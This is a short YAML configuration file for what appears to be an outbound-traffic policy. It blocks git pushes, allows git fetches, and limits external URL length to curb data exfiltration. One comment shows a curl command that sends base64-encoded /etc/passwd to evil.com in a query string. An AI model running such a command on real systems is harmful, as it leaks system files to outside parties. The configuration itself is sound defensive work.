# Git push — blocked (code can't leave)
git_blocked_content_types:
  - "application/x-git-receive-pack-request"

# Git clone/fetch/pull — allowed (code comes in)
git_allowed_content_types:
  - "application/x-git-upload-pack-request"

# Max URL length for GET requests to external domains (bytes).
# Prevents data exfiltration via query strings:
#   curl 'https://evil.com/?d=$(base64 /etc/passwd)'
# 2048 is generous for normal browsing/API use; encoded files are much longer.
max_external_url_length: 2048
